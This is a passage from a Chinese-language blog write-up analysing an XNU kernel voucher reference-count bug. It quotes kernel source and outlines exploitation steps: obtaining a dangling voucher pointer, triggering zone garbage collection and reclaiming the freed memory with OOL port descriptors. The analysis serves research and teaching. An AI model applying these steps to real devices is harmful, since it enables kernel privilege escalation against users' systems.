class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到上面的实现中，在<code>task_swap_mach_voucher</code>函数调用后，通过调用<code>ipc_voucher_release</code>函数将<code>new_voucher</code>的引用计数减1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">ipc_voucher_release(new_voucher);</span><br></pre></td></tr></table></figure>

<p>因此，这个过程中，引用计数的变化如下：</p>
<ol>
<li><code>new_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher = new_voucher</code>      &#x3D;&gt; <code>task_swap_mach_voucher()</code></li>
<li><code>new_voucher</code>的引用计数-1           &#x3D;&gt; <code>ipc_voucher_release()</code></li>
<li><code>new_voucher</code>的引用计数-1 <code>(old_voucher = new_voucher)  =&gt;  convert_voucher_to_port</code></li>
</ol>
<p>将<code>new_voucher</code>的引用计数减少为0，从而释放该对象。并且<code>old_voucher</code>的引用计数可以增加很多。如果存储指向<code>new_voucher</code>的指针，然后使用漏洞将<code>new_voucher</code>的引用计数减少为0，这样就有可能获得指向<code>new_voucher</code>的悬空指针。</p>
<h2 id="利用voucher"><a href="#利用voucher" class="headerlink" title="利用voucher"></a>利用voucher</h2><p>现在需要找到哪里可以存储<code>ipc_voucher</code>指针，方法是直接在内核源码中搜索<code>ipc_voucher_t</code>，发现在<code>osfmk/kern/thread.h</code>的thread对象有一个成员能够持有<code>ipc_voucher</code>指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_interrupt_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_platform_idle_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_1;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_2;</span><br><span class="line">	<span class="type">uint16_t</span>			thread_tag;</span><br><span class="line">	<span class="type">uint16_t</span>			callout_woken_from_icontext:<span class="number">1</span>,</span><br><span class="line">					callout_woken_from_platform_idle:<span class="number">1</span>,</span><br><span class="line">					callout_woke_thread:<span class="number">1</span>,</span><br><span class="line">					thread_bitfield_unused:<span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">mach_port_name_t</span>		ith_voucher_name;</span><br><span class="line">	<span class="type">ipc_voucher_t</span>			ith_voucher;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_IOSCHED</span></span><br><span class="line">	<span class="type">void</span> 				*decmp_upl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_IOSCHED */</span></span></span><br></pre></td></tr></table></figure>

<p>使用<code>thread_get_mach_voucher</code>和<code>thread_set_mach_voucher</code>函数从用户态读取和写入<code>voucher</code>引用。查看MIG为该函数生成的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine thread_get_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xthread_get_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">	thr_act = convert_port_to_thread(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	RetCode = thread_get_mach_voucher(thr_act, In0P-&gt;which, &amp;voucher);</span><br><span class="line">	thread_deallocate(thr_act);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3625</span>, <span class="string">&quot;thread_get_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦获得了指向已释放<code>voucher</code>对象的悬空指针，便可以使用其他对象占用已释放的<code>voucher</code>对象。但这并不容易，<code>voucher</code>通常位于自己的<code>ipc voucher zone</code>中，如<code>osfmk/ipc/ipc_voucher.c</code>所示，其中<code>zinit</code>为<code>voucher</code>分配了一个新<code>zone</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">natural_t</span> ipc_voucher_max = (task_max + thread_max) * <span class="number">2</span>;</span><br><span class="line">	<span class="type">natural_t</span> attr_manager_max = MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN;</span><br><span class="line">	<span class="type">iv_index_t</span> i;</span><br><span class="line"></span><br><span class="line">	ipc_voucher_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 ipc_voucher_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="string">&quot;ipc vouchers&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	ipc_voucher_attr_control_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 attr_manager_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="string">&quot;ipc voucher attr controls&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_attr_control_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize voucher hash */</span></span><br><span class="line">	ivht_lock_init();</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IV_HASH_BUCKETS; i++)</span><br><span class="line">		queue_init(&amp;ivht_bucket[i]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize global table locking */</span></span><br><span class="line">	ivgt_lock_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(MACH_VOUCHER_ATTR_KEY_USER_DATA) || defined(MACH_VOUCHER_ATTR_KEY_TEST)</span></span><br><span class="line">	user_data_attr_manager_init();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，被释放的<code>voucher</code>的内存将被放置在<code>zone</code>的<code>freelist</code>中，并在创建新<code>voucher</code>时分配给新<code>voucher</code>。为了用其他对象占用，唯一可行的方法是触发<code>zone</code>垃圾收集，它会将被释放的<code>voucher</code>的内存(最小大小为1页)移到<code>zone map</code>中，然后这些内存就可以重新分配给其他对象。可以通过分配大量<code>voucher</code>并释放它们来做到这一点。</p>
<p>回到MIG为<code>thread_get_mach_voucher</code>生成的代码。假设已经使用其他对象占据了已释放的<code>voucher</code>对象，则调用<code>thread_get_mach_voucher</code>应该成功而内核不会<code>panic</code>，这意味着该<code>voucher</code>应该具有有效的<code>iv_refs</code>成员。</p>
<p>随后，调用<code>convert_voucher_to_port</code>函数，该函数首先使用<code>assert()</code>检查<code>voucher</code>是否具有正确的引用计数。然后再使用<code>IP_VALID()</code>检查<code>voucher</code>端口的有效性。如果无效，则会分配一个新的<code>voucher</code>端口。这很有用，因为在分配伪造的<code>voucher</code>占用已释放的<code>voucher</code>时，如果以某种方式将<code>iv_port</code>指针设置为<code>NULL</code>，那么实际上还可以将新分配的<code>voucher</code>端口<code>(IKOT_VOUCHER)</code>返回到用户态<code>(ith_voucher-&gt;iv_port)</code>。这将使我们能够进一步操纵<code>voucher</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用OOL端口描述符进行堆风水"><a href="#利用OOL端口描述符进行堆风水" class="headerlink" title="利用OOL端口描述符进行堆风水"></a>利用OOL端口描述符进行堆风水</h2><p>回顾Mach复杂消息的描述符成员，其中有一个<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>消息类型。当通过<code>mach_msg</code>发送Mach消息时依次调用<code>mach_msg_send-&gt;ipc_kmsg_copyin-&gt;ipc_kmsg_copyin_body</code>，在<code>ipc_kmsg_copyin_body</code>函数中对于<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的情况会调用<code>ipc_kmsg_copyin_ool_ports_descriptor</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_object_t</span> dest,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span> kmsg,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> *optionp,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_return_t</span> *mr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *data;</span><br><span class="line">    <span class="type">ipc_object_t</span> *objects;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">mach_vm_offset_t</span> addr;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> user_disp;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> result_disp;</span><br><span class="line">    <span class="type">mach_msg_type_number_t</span> count;</span><br><span class="line">    <span class="type">mach_msg_copy_options_t</span> copy_option;</span><br><span class="line">    <span class="type">boolean_t</span> deallocate;</span><br><span class="line">    <span class="type">mach_msg_descriptor_type_t</span> type;</span><br><span class="line">    <span class="type">vm_size_t</span> ports_length, names_length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_64bit) &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor64_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = (<span class="type">mach_vm_offset_t</span>)user_ool_dsc-&gt;address;</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor32_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = CAST_USER_ADDR_T(user_ool_dsc-&gt;address);</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dsc-&gt;deallocate = deallocate;</span><br><span class="line">    dsc-&gt;copy = copy_option;</span><br><span class="line">    dsc-&gt;type = type;</span><br><span class="line">    dsc-&gt;count = count;</span><br><span class="line">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span><br><span class="line"></span><br><span class="line">    result_disp = ipc_object_copyin_type(user_disp);</span><br><span class="line">    dsc-&gt;disposition = result_disp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We always do a &#x27;physical copy&#x27;, but you have to specify something valid */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_option != MACH_MSG_PHYSICAL_COPY &amp;&amp;</span><br><span class="line">        copy_option != MACH_MSG_VIRTUAL_COPY) &#123;</span><br><span class="line">        *mr = MACH_SEND_INVALID_TYPE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* calculate length of data in bytes, rounding up */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_t</span>), &amp;ports_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>), &amp;names_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ports_length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> user_dsc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = kalloc(ports_length); <span class="comment">// 分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *mr = MACH_SEND_NO_BUFFER;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = &amp;((<span class="type">mach_port_name_t</span> *)data)[count];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">mach_port_name_t</span> *names = ((<span class="type">mach_port_name_t</span> *)data);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copyinmap(<span class="built_in">map</span>, addr, names, names_length) != KERN_SUCCESS) &#123;</span><br><span class="line">        kfree(data, ports_length);</span><br><span class="line">        *mr = MACH_SEND_INVALID_MEMORY;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deallocate) &#123;</span><br><span class="line">        (<span class="type">void</span>) mach_vm_deallocate(<span class="built_in">map</span>, addr, (<span class="type">mach_vm_size_t</span>)ports_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    objects = (<span class="type">ipc_object_t</span> *) data; <span class="comment">// 转ipc_object_t类型</span></span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">mach_port_name_t</span> name = names[i];</span><br><span class="line">        <span class="type">ipc_object_t</span> object;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (<span class="type">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">kern_return_t</span> kr = ipc_object_copyin(space, name, user_disp, &amp;object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                object = objects[j];</span><br><span class="line">                <span class="keyword">if</span> (IPC_OBJECT_VALID(object))</span><br><span class="line">                    ipc_object_destroy(object, result_disp);</span><br><span class="line">            &#125;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">            dsc-&gt;address = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">if</span> ((*optionp &amp; MACH_SEND_KERNEL) == <span class="number">0</span>) &#123;</span><br><span class="line">				mach_port_guard_exception(name, <span class="number">0</span>, <span class="number">0</span>, kGUARD_EXC_SEND_INVALID_RIGHT);</span><br><span class="line">			&#125;</span><br><span class="line">            *mr = MACH_SEND_INVALID_RIGHT;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> 